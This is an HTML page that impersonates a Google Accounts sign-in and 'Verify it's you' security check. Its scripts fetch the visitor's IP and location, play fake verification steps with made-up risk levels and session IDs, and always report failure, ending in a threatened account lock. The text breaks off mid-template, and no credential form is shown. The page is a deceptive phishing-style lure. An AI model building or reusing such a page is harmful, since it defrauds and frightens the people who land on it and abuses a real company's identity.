<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'><path fill='%234285F4' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/><path fill='%2334A853' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/><path fill='%23FBBC05' d='M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z'/><path fill='%23EA4335' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z'/></svg>" type="image/svg+xml">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Google Sans', Roboto, arial, sans-serif;
            background: #fff;
            color: #202124;
            line-height: 1.5;
            font-size: 14px;
            overflow-x: hidden;
        }
        
        .container {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 24px;
            position: relative;
        }
        
        .card {
            background: #fff;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            width: 100%;
            max-width: 450px;
            box-shadow: 0 2px 10px 0 rgba(0,0,0,.2);
            position: relative;
            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
        }
        
        .logo {
            text-align: center;
            margin-bottom: 16px;
        }
        
        .google-logo {
            width: 75px;
            height: 24px;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 272 92"><path fill="%234285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="%23EA4335" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="%23FBBC05" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/><path fill="%23EA4335" d="M225 3v65h-9.5V3h9.5z"/><path fill="%2334A853" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/><path fill="%234285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c9.66 0 16.7 3.86 21.98 8.84l-6.21 6.21c-3.86-3.68-9.1-6.72-15.77-6.72-12.94 0-23.11 10.41-23.11 23.11s10.17 23.11 23.11 23.11c8.31 0 13.03-3.35 16.05-6.37 2.44-2.44 4.04-5.96 4.69-10.76H35.29z"/></svg>') no-repeat;
            background-size: contain;
            display: inline-block;
        }
        
        .title {
            font-size: 24px;
            font-weight: 400;
            margin: 16px 0 8px;
            text-align: center;
            color: #202124;
        }
        
        .subtitle {
            color: #5f6368;
            font-size: 16px;
            text-align: center;
            margin-bottom: 24px;
            line-height: 1.5;
        }
        
        .progress-steps {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 32px;
            gap: 8px;
        }
        
        .step {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: 500;
            transition: all 0.3s ease;
        }
        
        .step.completed {
            background: #1a73e8;
            color: white;
        }
        
        .step.active {
            background: #1a73e8;
            color: white;
        }
        
        .step.pending {
            background: #f8f9fa;
            border: 1px solid #dadce0;
            color: #5f6368;
        }
        
        .step-separator {
            width: 40px;
            height: 1px;
            background: #dadce0;
        }
        
        .security-info {
            background: #f8f9fa;
            border: 1px solid #e8eaed;
            border-radius: 8px;
            padding: 16px;
            margin-bottom: 24px;
            display: flex;
            align-items: flex-start;
            gap: 12px;
        }
        
        .security-icon {
            width: 20px;
            height: 20px;
            fill: #34a853;
            flex-shrink: 0;
            margin-top: 2px;
        }
        
        .security-text {
            color: #5f6368;
            font-size: 13px;
            line-height: 1.4;
        }
        
        .loading-container {
            text-align: center;
            padding: 24px 0;
        }
        
        .spinner {
            width: 20px;
            height: 20px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #1a73e8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 16px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-text {
            color: #5f6368;
            font-size: 14px;
            margin-bottom: 8px;
        }
        
        .loading-details {
            color: #80868b;
            font-size: 12px;
        }
        
        .continue-btn {
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 12px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            margin-top: 16px;
            transition: all 0.2s ease;
            font-family: inherit;
        }
        
        .continue-btn:hover:not(:disabled) {
            background: #1557b0;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,.3), 0 1px 3px 1px rgba(60,64,67,.15);
        }
        
        .continue-btn:disabled {
            background: #f8f9fa;
            color: #5f6368;
            cursor: not-allowed;
        }
        
        .error-container {
            background: #fef7e0;
            border: 1px solid #fbc02d;
            border-radius: 8px;
            padding: 16px;
            margin-top: 16px;
            display: flex;
            align-items: flex-start;
            gap: 12px;
        }
        
        .error-icon {
            width: 20px;
            height: 20px;
            fill: #f57c00;
            flex-shrink: 0;
            margin-top: 2px;
        }
        
        .error-text {
            color: #e37400;
            font-size: 13px;
            line-height: 1.4;
        }
        
        .security-details {
            margin-top: 24px;
            padding-top: 24px;
            border-top: 1px solid #e8eaed;
        }
        
        .detail-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            font-size: 12px;
        }
        
        .detail-label {
            color: #5f6368;
        }
        
        .detail-value {
            color: #202124;
            font-family: monospace;
        }
        
        .help-links {
            margin-top: 32px;
            text-align: center;
        }
        
        .help-link {
            color: #1a73e8;
            text-decoration: none;
            font-size: 12px;
            margin: 0 8px;
        }
        
        .help-link:hover {
            text-decoration: underline;
        }
        
        .fade-in {
            animation: fadeIn 0.4s ease-in;
        }
        
        .slide-up {
            animation: slideUp 0.5s ease-out;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .verification-steps {
            margin: 24px 0;
        }
        
        .verification-step {
            display: flex;
            align-items: center;
            padding: 12px 0;
            border-bottom: 1px solid #f1f3f4;
            transition: all 0.3s ease;
        }
        
        .verification-step:last-child {
            border-bottom: none;
        }
        
        .step-icon {
            width: 16px;
            height: 16px;
            margin-right: 12px;
            fill: #5f6368;
        }
        
        .step-icon.success {
            fill: #34a853;
        }
        
        .step-icon.loading {
            fill: #1a73e8;
            animation: pulse 1.5s ease-in-out infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        
        .step-text {
            flex: 1;
            color: #202124;
            font-size: 14px;
        }
        
        .step-status {
            color: #5f6368;
            font-size: 12px;
        }
        
        .footer-info {
            position: fixed;
            bottom: 24px;
            right: 24px;
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border: 1px solid #e8eaed;
            border-radius: 8px;
            padding: 12px 16px;
            font-size: 11px;
            color: #5f6368;
            max-width: 200px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        
        @media (max-width: 480px) {
            .container { padding: 16px; }
            .card { padding: 24px 20px; }
            .footer-info { display: none; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card" id="mainCard">
            <div id="content"></div>
        </div>
        
        <div class="footer-info" id="footerInfo"></div>
    </div>

    <script>
        class GoogleVerification {
            constructor() {
                this.currentStep = 1;
                this.platform = this.getPlatformFromURL();
                this.userIP = '';
                this.userLocation = '';
                this.sessionId = this.generateSessionId();
                this.verificationSteps = [];
                this.attemptCount = 0;
                this.maxAttempts = 3;
                
                this.init();
            }
            
            init() {
                this.getUserIP();
                this.renderInitialContent();
                this.updateFooterInfo();
                this.startSecurityLogging();
            }
            
            getPlatformFromURL() {
                const urlParams = new URLSearchParams(window.location.search);
                return urlParams.get('platform') || 'Account';
            }
            
            generateSessionId() {
                return 'GV_' + Math.random().toString(36).substr(2, 9).toUpperCase();
            }
            
            async getUserIP() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    this.userIP = data.ip;
                    
                    const locationResponse = await fetch(`https://ipapi.co/${this.userIP}/json/`);
                    const locationData = await locationResponse.json();
                    this.userLocation = `${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
                } catch (error) {
                    this.userIP = '192.168.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255);
                    this.userLocation = 'Unknown Location';
                }
                this.updateFooterInfo();
            }
            
            renderInitialContent() {
                const content = document.getElementById('content');
                content.innerHTML = `
                    <div class="logo">
                        <div class="google-logo"></div>
                    </div>
                    <div class="title">Verify it's you</div>
                    <div class="subtitle">Google protects this account with advanced security</div>
                    
                    <div class="progress-steps">
                        <div class="step completed">✓</div>
                        <div class="step-separator"></div>
                        <div class="step active">2</div>
                        <div class="step-separator"></div>
                        <div class="step pending">3</div>
                    </div>
                    
                    <div class="security-info">
                        <svg class="security-icon" viewBox="0 0 24 24">
                            <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M10,17L6,13L7.41,11.59L10,14.17L16.59,7.58L18,9L10,17Z"/>
                        </svg>
                        <div class="security-text">
                            <strong>Advanced Protection is active</strong><br>
                            This ${this.platform} account requires additional verification for security.
                        </div>
                    </div>
                    
                    <div class="verification-steps">
                        <div class="verification-step">
                            <svg class="step-icon success" viewBox="0 0 24 24">
                                <path d="M9,20.42L2.79,14.21L5.62,11.38L9,14.77L18.88,4.88L21.71,7.71L9,20.42Z"/>
                            </svg>
                            <div class="step-text">Device recognition</div>
                            <div class="step-status">Verified</div>
                        </div>
                        <div class="verification-step">
                            <svg class="step-icon loading" viewBox="0 0 24 24">
                                <path d="M12,4V2A10,10 0 0,0 2,12H4A8,8 0 0,1 12,4Z"/>
                            </svg>
                            <div class="step-text">Location verification</div>
                            <div class="step-status">In progress...</div>
                        </div>
                        <div class="verification-step">
                            <svg class="step-icon" viewBox="0 0 24 24">
                                <path d="M12,17A2,2 0 0,0 14,15C14,13.89 13.1,13 12,13A2,2 0 0,0 10,15A2,2 0 0,0 12,17M18,8A2,2 0 0,1 20,10V20A2,2 0 0,1 18,22H6A2,2 0 0,1 4,20V10C4,8.89 4.9,8 6,8H7V6A5,5 0 0,1 12,1A5,5 0 0,1 17,6V8H18M12,3A3,3 0 0,0 9,6V8H15V6A3,3 0 0,0 12,3Z"/>
                            </svg>
                            <div class="step-text">Security challenge</div>
                            <div class="step-status">Pending</div>
                        </div>
                    </div>
                    
                    <button class="continue-btn" onclick="verification.proceedToLocationVerification()">
                        Continue with verification
                    </button>
                    
                    <div class="security-details">
                        <div class="detail-row">
                            <span class="detail-label">Session ID:</span>
                            <span class="detail-value">${this.sessionId}</span>
                        </div>
                        <div class="detail-row">
                            <span class="detail-label">Protection Level:</span>
                            <span class="detail-value">MAXIMUM</span>
                        </div>
                        <div class="detail-row">
                            <span class="detail-label">Account Type:</span>
                            <span class="detail-value">${this.platform} Protected</span>
                        </div>
                    </div>
                    
                    <div class="help-links">
                        <a href="#" class="help-link" onclick="verification.showHelpInfo(event)">Why am I seeing this?</a>
                        <a href="#" class="help-link" onclick="verification.showSupportInfo(event)">Get help</a>
                    </div>
                `;
            }
            
            proceedToLocationVerification() {
                this.currentStep = 2;
                this.showLocationVerification();
            }
            
            showLocationVerification() {
                const content = document.getElementById('content');
                content.innerHTML = `
                    <div class="logo">
                        <div class="google-logo"></div>
                    </div>
                    <div class="title">Verify your location</div>
                    <div class="subtitle">We detected access from a new location</div>
                    
                    <div class="progress-steps">
                        <div class="step completed">✓</div>
                        <div class="step-separator"></div>
                        <div class="step completed">✓</div>
                        <div class="step-separator"></div>
                        <div class="step active">3</div>
                    </div>
                    
                    <div class="loading-container">
                        <div class="spinner"></div>
                        <div class="loading-text">Verifying location data...</div>
                        <div class="loading-details">IP: ${this.userIP}</div>
                        <div class="loading-details">Location: ${this.userLocation}</div>
                    </div>
                    
                    <div class="security-info">
                        <svg class="security-icon" viewBox="0 0 24 24">
                            <path d="M12,11.5A2.5,2.5 0 0,1 9.5,9A2.5,2.5 0 0,1 12,6.5A2.5,2.5 0 0,1 14.5,9A2.5,2.5 0 0,1 12,11.5M12,2A7,7 0 0,0 5,9C5,14.25 12,22 12,22S19,14.25 19,9A7,7 0 0,0 12,2Z"/>
                        </svg>
                        <div class="security-text">
                            <strong>Location verification required</strong><br>
                            We're checking if this location matches your typical sign-in pattern.
                        </div>
                    </div>
                `;
                
                setTimeout(() => {
                    this.showSecurityChallenge();
                }, 3000);
            }
            
            showSecurityChallenge() {
                this.currentStep = 3;
                const content = document.getElementById('content');
                content.innerHTML = `
                    <div class="logo">
                        <div class="google-logo"></div>
                    </div>
                    <div class="title">Security challenge</div>
                    <div class="subtitle">Complete the final verification step</div>
                    
                    <div class="progress-steps">
                        <div class="step completed">✓</div>
                        <div class="step-separator"></div>
                        <div class="step completed">✓</div>
                        <div class="step-separator"></div>
                        <div class="step completed">✓</div>
                    </div>
                    
                    <div class="security-info">
                        <svg class="security-icon" viewBox="0 0 24 24">
                            <path d="M12,17A2,2 0 0,0 14,15C14,13.89 13.1,13 12,13A2,2 0 0,0 10,15A2,2 0 0,0 12,17M18,8A2,2 0 0,1 20,10V20A2,2 0 0,1 18,22H6A2,2 0 0,1 4,20V10C4,8.89 4.9,8 6,8H7V6A5,5 0 0,1 12,1A5,5 0 0,1 17,6V8H18M12,3A3,3 0 0,0 9,6V8H15V6A3,3 0 0,0 12,3Z"/>
                        </svg>
                        <div class="security-text">
                            <strong>Advanced Protection Challenge</strong><br>
                            Verifying your identity with biometric and behavioral analysis.
                        </div>
                    </div>
                    
                    <div class="verification-steps">
                        <div class="verification-step">
                            <svg class="step-icon loading" viewBox="0 0 24 24">
                                <path d="M12,4V2A10,10 0 0,0 2,12H4A8,8 0 0,1 12,4Z"/>
                            </svg>
                            <div class="step-text">Analyzing device fingerprint</div>
                            <div class="step-status">Processing...</div>
                        </div>
                        <div class="verification-step">
                            <svg class="step-icon loading" viewBox="0 0 24 24">
                                <path d="M12,4V2A10,10 0 0,0 2,12H4A8,8 0 0,1 12,4Z"/>
                            </svg>
                            <div class="step-text">Behavioral pattern matching</div>
                            <div class="step-status">Analyzing...</div>
                        </div>
                        <div class="verification-step">
                            <svg class="step-icon loading" viewBox="0 0 24 24">
                                <path d="M12,4V2A10,10 0 0,0 2,12H4A8,8 0 0,1 12,4Z"/>
                            </svg>
                            <div class="step-text">Network security check</div>
                            <div class="step-status">Validating...</div>
                        </div>
                    </div>
                    
                    <button class="continue-btn" disabled>
                        Completing verification...
                    </button>
                    
                    <div class="security-details">
                        <div class="detail-row">
                            <span class="detail-label">Challenge Type:</span>
                            <span class="detail-value">MULTI-FACTOR</span>
                        </div>
                        <div class="detail-row">
                            <span class="detail-label">Risk Level:</span>
                            <span class="detail-value">HIGH</span>
                        </div>
                        <div class="detail-row">
                            <span class="detail-label">Timestamp:</span>
                            <span class="detail-value">${new Date().toISOString()}</span>
                        </div>
                    </div>
                `;
                
                setTimeout(() => {
                    this.showVerificationFailure();
                }, 4500);
            }

            showVerificationFailure() {
                this.attemptCount++;
                const content = document.getElementById('content');
                
                if (this.attemptCount >= this.maxAttempts) {
                    this.showAccountLocked();
                    return;
                }
                
                content.innerHTML = `
                    <div class="logo">
                        <div class="google-logo"></div>
                    </div>
                    <div class="title">Verification incomplete</div>
                    <div class="subtitle">Additional security measures required</div>
                    <div class="progress-steps">
                    <div class="step completed">✓</div>
                    <div class="step-separator"></div>
                    <div class="step completed">✓</div>
                    <div class="step-separator"></div>
                    <div class="step pending">!</div>
                </div>
